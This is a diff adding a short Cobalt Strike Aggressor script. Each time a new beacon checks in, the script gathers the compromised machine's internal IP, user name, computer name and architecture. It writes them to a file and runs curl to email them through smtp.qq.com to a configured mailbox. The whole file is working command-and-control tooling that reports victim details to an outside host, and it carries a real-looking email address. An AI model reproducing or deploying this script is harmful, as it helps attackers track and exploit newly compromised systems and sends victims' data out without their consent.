@@ -1,0 +1,22 @@
+#author: S0cke3t
+
+#Config
+$From = "1510536500@qq.com";
+$To = "1510536500@qq.com";
+$UserName = "1510536500@qq.com";
+$Password = "xxxxxxxxxxxx";#Mailbox Third Party Authorization Code, Not Mailbox Password!
+#Config
+
+on beacon_initial{
+    local('$Ip $User $ComName $Arch $Handle $Mail_content');
+    $IP = beacon_info($1, "internal");
+    $User = beacon_info($1, "user");
+    $ComName = beacon_info($1, "computer");
+    $Arch = beacon_info($1, "barch");
+    $Mail_content = "From:".$From."\r\nTo:".$To."\r\nSubject:CobaltStriker\r\n\r\nIP:".$IP."\r\nUser:".$User."\r\nComputerName:".$ComName."\r\nArch:".$Arch;
+    $Handle = openf(">mail.txt");
+    writeb($Handle, $Mail_content); 
+    @Curl_command = @('curl', '-s' ,'--url','smtp://smtp.qq.com', '--mail-from', $From, '--mail-rcpt', $To, '--upload-file','mail.txt', '--user', $UserName.':'.$Password);
+    exec(@Curl_command);
+    action("\c9Send Done: ".$ComName."!");
+}
